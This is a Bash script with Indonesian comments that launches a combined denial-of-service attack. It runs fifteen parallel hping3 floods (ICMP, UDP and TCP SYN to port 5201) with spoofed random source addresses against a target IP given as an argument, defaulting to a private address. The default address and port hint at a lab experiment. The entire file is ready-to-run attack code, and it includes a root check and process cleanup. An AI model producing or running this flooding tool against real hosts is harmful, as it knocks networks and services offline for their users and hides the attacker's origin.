#!/bin/bash
# Serangan Kombinasi - Menjalankan ICMP, UDP, dan TCP SYN flood secara bersamaan
# Script ini adalah serangan paling dahsyat dengan 5 instance dari setiap tipe serangan
# 
# Penggunaan:
#   sudo ./attack_combined.sh [TARGET_IP]
#   
# Jika TARGET_IP tidak diberikan, default adalah 192.168.0.118
# Tekan Ctrl+C untuk berhenti dan membersihkan semua proses

# Default target IP
TARGET_IP="${1:-192.168.0.118}"

# Array untuk menyimpan PID dari semua proses serangan
declare -a PIDS=()

echo "=========================================="
echo "   COMBINED ATTACK (PALING DAHSYAT!)"
echo "=========================================="
echo "Target: $TARGET_IP"
echo ""
echo "Serangan yang akan diluncurkan:"
echo "  - 5x ICMP flood (ping latency)"
echo "  - 5x UDP flood (bandwidth consumption)"
echo "  - 5x TCP SYN flood ke port 5201 (throughput)"
echo ""
echo "Total: 15 instance hping3 berjalan paralel"
echo ""
echo "Tekan Ctrl+C untuk menghentikan SEMUA serangan"
echo "=========================================="
echo ""

# Cek apakah hping3 terinstal
if ! command -v hping3 &> /dev/null; then
    echo "ERROR: hping3 tidak terinstal!"
    echo "Install dengan: sudo apt install hping3"
    exit 1
fi

# Cek apakah script dijalankan dengan sudo
if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Script ini harus dijalankan dengan sudo"
    echo "Gunakan: sudo ./attack_combined.sh"
    exit 1
fi

# Fungsi untuk membersihkan semua proses saat Ctrl+C
cleanup() {
    echo ""
    echo "=========================================="
    echo "Menghentikan semua serangan..."
    echo "=========================================="
    
    # Kill semua hping3 processes
    killall hping3 2>/dev/null
    
    echo "Semua serangan dihentikan!"
    echo ""
    exit 0
}

# Set trap untuk menangkap Ctrl+C
trap cleanup SIGINT SIGTERM

echo "Meluncurkan serangan..."
echo ""

# Luncurkan 5 instance ICMP flood
for i in {1..5}; do
    hping3 --icmp --flood --rand-source "$TARGET_IP" &>/dev/null &
    PIDS+=($!)
    echo "[ICMP #$i] PID: $! - Started"
done

# Luncurkan 5 instance UDP flood
for i in {1..5}; do
    hping3 --udp --flood --rand-source --rand-dest "$TARGET_IP" &>/dev/null &
    PIDS+=($!)
    echo "[UDP #$i] PID: $! - Started"
done

# Luncurkan 5 instance TCP SYN flood ke port 5201
for i in {1..5}; do
    hping3 -S --flood --rand-source -p 5201 "$TARGET_IP" &>/dev/null &
    PIDS+=($!)
    echo "[TCP #$i] PID: $! - Started"
done

echo ""
echo "=========================================="
echo "SEMUA SERANGAN AKTIF!"
echo "=========================================="
echo "Total proses: ${#PIDS[@]}"
echo ""
echo "PIDs yang aktif:"
for pid in "${PIDS[@]}"; do
    echo "  - $pid"
done
echo ""
echo "Tekan Ctrl+C untuk menghentikan semua serangan"
echo "=========================================="
echo ""

# Tunggu sampai user menekan Ctrl+C
while true; do
    sleep 1
done
